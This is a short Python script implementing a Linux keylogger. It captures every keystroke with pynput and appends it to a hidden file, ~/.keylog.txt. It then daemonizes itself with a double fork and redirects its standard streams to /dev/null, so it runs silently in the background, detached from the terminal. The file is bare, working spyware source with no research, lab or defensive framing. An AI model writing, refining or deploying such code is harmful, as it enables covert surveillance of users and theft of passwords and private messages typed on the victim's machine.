import os
import sys
import platform
from pynput import keyboard
from multiprocessing import Process
import subprocess

os_name = platform.system()

if os_name == 'Linux':
    log_file = os.path.expanduser("~/.keylog.txt")

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def daemonize():
    if os.fork() > 0:
        return
    os.setsid()
    if os.fork() > 0:
        sys.exit()
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')
    sys.stdin = open(os.devnull, 'r')
    start_keylogger()

if __name__ == "__main__":
    if os_name =='Linux':
        Process(target=daemonize).start()
        

